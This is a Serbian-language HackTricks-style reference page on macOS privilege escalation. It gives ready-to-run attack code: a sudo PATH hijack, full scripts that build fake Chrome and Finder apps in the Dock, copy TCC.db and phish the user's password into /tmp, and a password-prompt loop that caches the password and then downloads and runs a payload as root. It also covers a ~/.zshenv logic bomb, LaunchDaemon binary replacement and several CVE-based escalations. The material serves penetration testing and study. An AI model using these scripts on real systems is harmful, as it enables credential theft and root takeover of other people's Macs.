# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Ako ste ovde došli tražeći TCC privilege escalation, idite na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Mnoge privilege-escalation tehnike koje utiču na Linux ili druge Unix-like sisteme takođe se primenjuju na macOS. Pogledajte:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Originalnu [Sudo Hijacking tehniku možete pronaći u objavi o Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Međutim, macOS **zadržava** korisnikov **`PATH`** kada izvršava **`sudo`**. To znači da bi drugi način za izvođenje ovog napada bio **hijacking drugih binarnih datoteka** koje će žrtva ipak izvršiti kada **pokreće sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Napominjemo da će korisnik koji koristi **terminal** vrlo verovatno imati **Homebrew instaliran**. Zato je moguće preuzeti kontrolu nad binarnim datotekama u **`/opt/homebrew/bin`**.

### Oponašanje Dock-a

Korišćenjem neke vrste **social engineering** možete **oponašati, na primer, Google Chrome** unutar Dock-a i zapravo izvršiti sopstveni skript:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Neki predlozi:

- Proverite u Dock-u da li postoji Chrome i, ako postoji, **uklonite** taj unos i **dodajte** **lažni** **Chrome unos na isto mesto** u nizu Dock-a.

<details>
<summary>Skript za oponašanje Chrome-a u Dock-u</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Neki predlozi:

- **Ne možete ukloniti Finder iz Dock-a**, pa ako ćete ga dodati u Dock, možete postaviti lažni Finder odmah pored pravog. Za ovo je potrebno da **dodate unos lažnog Finder-a na početak niza Dock-a**.
- Druga opcija je da ga ne postavite u Dock, već samo da ga otvorite; „Finder traži dozvolu za kontrolu Finder-a“ nije toliko čudno.
- Druga opcija za **eskalaciju na root bez traženja** lozinke uz užasan prozor jeste da naterate Finder da zaista zatraži lozinku za izvršavanje privilegovane radnje:
- Zatražite od Finder-a da kopira novu **`sudo`** datoteku u **`/etc/pam.d`** (upit za lozinku će navesti da „Finder želi da kopira sudo“)
- Zatražite od Finder-a da kopira novi **Authorization Plugin** (možete kontrolisati naziv datoteke, pa će upit za lozinku navesti da „Finder želi da kopira Finder.bundle“)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing kroz prompt za lozinku + ponovna upotreba sudo-a

Malware često zloupotrebljava interakciju korisnika kako bi **preuzeo lozinku koja omogućava sudo** i programski je ponovo upotrebio. Uobičajen tok:

1. Identifikujte prijavljenog korisnika pomoću `whoami`.
2. **Ponavljajte promptove za lozinku** sve dok `dscl . -authonly "$user" "$pw"` ne vrati uspeh.
3. Keširajte kredencijal (npr. `/tmp/.pass`) i izvršavajte privilegovane radnje pomoću `sudo -S` (lozinka preko standardnog ulaza).

Primer minimalnog lanca:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ukradena lozinka se zatim može ponovo koristiti za **uklanjanje Gatekeeper quarantine oznake pomoću `xattr -c`**, kopiranje LaunchDaemons ili drugih privilegovanih datoteka i neinteraktivno pokretanje dodatnih faza.<sup>[[1]](#references)</sup>

## Noviji macOS-specifični vektori (2023–2026)

### Zastareli `AuthorizationExecuteWithPrivileges` je i dalje upotrebljiv

`AuthorizationExecuteWithPrivileges` je zastareo u verziji 10.7, ali **i dalje radi na Sonoma/Sequoia**. Mnogi komercijalni updateri pozivaju `/usr/libexec/security_authtrampoline` sa nepouzdanim path-om. Ako je ciljna binarna datoteka user-writable, možete postaviti trojan i iskoristiti legitimni prompt:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombinujte sa **masquerading trikovima iznad** da biste prikazali uverljiv dijalog za lozinku.


### Privileged helper / XPC triage

Mnogi moderni macOS privescs trećih strana prate isti obrazac: **root LaunchDaemon** izlaže **Mach/XPC service** iz direktorijuma **`/Library/PrivilegedHelperTools`**, a zatim helper ili **ne validira client**, validira ga **prekasno** (PID race), ili izlaže **root method** koji koristi putanju/script pod kontrolom korisnika. Ovo je klasa bugova koja stoji iza mnogih novijih helper bugova u VPN clientima, game launcherima i updaterima.<sup>[[2]](#references)</sup>

Brza triage checklista:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Posebnu pažnju obratite na helpere koji:

- nastavljaju da prihvataju zahteve **nakon deinstalacije** jer je posao ostao učitan u `launchd`
- izvršavaju skripte ili čitaju konfiguraciju iz **`/Applications/...`** ili drugih putanja u koje korisnici koji nisu root mogu da upisuju
- oslanjaju se na validaciju peer-a zasnovanu na **PID-u** ili samo na **bundle-id-u**, koja može biti podložna race uslovima

Za više detalja o greškama u autorizaciji helpera pogledajte [ovu stranicu](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Nasleđivanje okruženja skripte u PackageKit-u (CVE-2024-27822)

Dok Apple nije otklonio ovaj problem u verzijama **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5**, instalacije koje je pokrenuo korisnik putem **`Installer.app`** / **`PackageKit.framework`** mogle su da izvršavaju **PKG skripte kao root unutar okruženja trenutno prijavljenog korisnika**. To znači da bi paket koji koristi **`#!/bin/zsh`** učitao napadačev **`~/.zshenv`** i izvršio ga kao **root** kada bi žrtva instalirala paket.<sup>[[3]](#references)</sup>

Ovo je naročito zanimljivo kao **logic bomb**: potreban vam je samo foothold na korisničkom nalogu i shell startup fajl u koji može da se upisuje, nakon čega čekate da korisnik izvrši bilo koji ranjivi installer zasnovan na **zsh-u**. Ovo se uglavnom **ne odnosi** na implementacije putem **MDM/Munki-ja**, jer se one izvršavaju unutar okruženja root korisnika.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Ako želite detaljniji uvid u zloupotrebu specifičnu za installere, pogledajte i [ovu stranicu](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Sudar odredišta installera preko `.localized`

Neki third-party installeri registruju root LaunchDaemon čija je izvršna datoteka navedena pomoću fiksne putanje unutar `/Applications/Target.app`. Ako attacker može prvi da kreira taj bundle sa **drugačijim bundle identifier-om**, Installer može da zadrži decoy i smesti pravu aplikaciju na `/Applications/Target.localized/Target.app`. Daemon i dalje upućuje na prvobitnu putanju. Zbog toga izvršna datoteka pod kontrolom attackera unutar decoy bundle-a kasnije može da se pokrene kao root.<sup>[[8]](#references)</sup>

Važni preduslovi su:<sup>[[8]](#references)</sup>

1. Attacker može da kreira ili kontroliše očekivanu putanju aplikacije.
2. Package ne uklanja konfliktni bundle.
3. Privilegovani job koristi hard-coded putanju unutar tog bundle-a.
4. User ili MDM workflow instalira package i registruje job.

Potražite relocated bundle-ove, a zatim pregledajte LaunchDaemon targete pomoću enumeration loop-a u sledećem odeljku:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
Bezbedniji installer razrešava konačnu lokaciju bundle-a i čuva privilegovane izvršne datoteke na lokaciji čiji je vlasnik root, kao što je `/Library/PrivilegedHelperTools`. Takođe bi trebalo da proveri vlasništvo i potpisivanje koda pre registrovanja ili pokretanja job-a.<sup>[[8]](#references)</sup>

### Hijacking upisivog LaunchDaemon target-a

LaunchDaemon plist može biti u vlasništvu root-a, dok njegov `Program` ili prvi unos `ProgramArguments` pokazuje na direktorijum u koji korisnik može da upisuje. Proverite **celu putanju**, a ne samo dozvole izvršne datoteke. Ako je roditeljski direktorijum upisiv, attacker može da preimenuje izvršnu datoteku u vlasništvu root-a i kreira zamenu na istoj putanji. Zamena će se pokrenuti kao root sledeći put kada se job pokrene. Dovoljan je reboot ili uobičajeni restart servisa. Attacker-u nije potrebna dozvola za pokretanje `launchctl bootstrap` u sistemskom domenu.<sup>[[7]](#references)</sup>

Prvo enumerišite svaki target i njegov neposredni roditeljski direktorijum:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Kada je datoteka ili njen nadređeni direktorijum upisiv, sačuvajte originalni binarni fajl i zamenite putanju izvršnim payloadom. Zatim sačekajte da se već učitani daemon ponovo pokrene.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

Ranljiva putanja `kauth_cred_proc_update` ažurirala je `proc_ro.p_ucred` pomoću neatomskog API-ja `zalloc_ro_mut`, dok su SMR čitači učitavali pokazivač bez zaključavanja. Javni trigger koristi posebno pripremljeni setgid binary. Jedna nit se prebacuje između svojih realnih i efektivnih ID-ova grupa, dok druga nit ponavljano ulazi u syscall kao što je `getgid()`.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Tretirajte ovo kao **race primitive**, a ne kao gotov root exploit. Objavljeni PoC demonstrira oštećeni credential pointer. Najčešće se završava kernel panic-om. Istraživač je reprodukovao korupciju samo na Intel-u i nije obezbedio determinističku kontrolu nad rezultujućim credential objektom. Apple je u macOS-u 15.3 promenio ažuriranje u atomic pointer exchange.<sup>[[4]](#references)</sup>

### SIP bypass putem Migration Assistant-a ("Migraine", CVE-2023-32369)

Ako već imate root, SIP i dalje blokira upisivanje u sistemske lokacije. Greška **Migraine** zloupotrebljava entitlement Migration Assistant-a `com.apple.rootless.install.heritable` da pokrene child process koji nasleđuje SIP bypass i prepisuje zaštićene putanje (npr. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Lanac:

1. Dobijte root na aktivnom sistemu.
2. Aktivirajte `systemmigrationd` pomoću posebno napravljenog stanja kako bi pokrenuo binary pod kontrolom napadača.
3. Iskoristite nasleđeni entitlement za izmenu SIP-zaštićenih fajlova, čime se persistence zadržava i nakon reboot-a.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 klasa grešaka)

Više Apple daemon-a prihvata **NSPredicate** objekte putem XPC-a i proverava samo polje `expressionType`, nad kojim napadač ima kontrolu. Pravljenjem predicate-a koji evaluira proizvoljne selektore možete postići **code execution u root/system XPC servisima** (npr. `coreduetd`, `contextstored`). Kada se kombinuje sa početnim app sandbox escape-om, ovo omogućava **privilege escalation bez korisničkih upita**. Potražite XPC endpoint-e koji deserijalizuju predicate-e i nemaju robustan visitor.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass i privilege escalation

**Bilo koji korisnik** (čak i korisnik bez privilegija) može da kreira i mount-uje Time Machine snapshot pomoću `-o noowners` i **pristupi SVIM fajlovima** tog snapshot-a, zaobilazeći provere vlasništva na aktivnom volume-u. Jedina potrebna privilegija jeste da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Komande i potpuno objašnjenje nalaze se na stranici o TCC bypass-ima:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Osetljive informacije

Ovo može biti korisno za privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, godina Infostealer-a](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Local privilege escalation u AWS Client VPN-u za macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Privilege escalation u macOS PackageKit-u](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Nova klasa privilege escalation grešaka na macOS-u i iOS-u (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: privilege escalation i persistence putem nesigurnih dozvola foldera](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE putem .localized direktorijuma](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
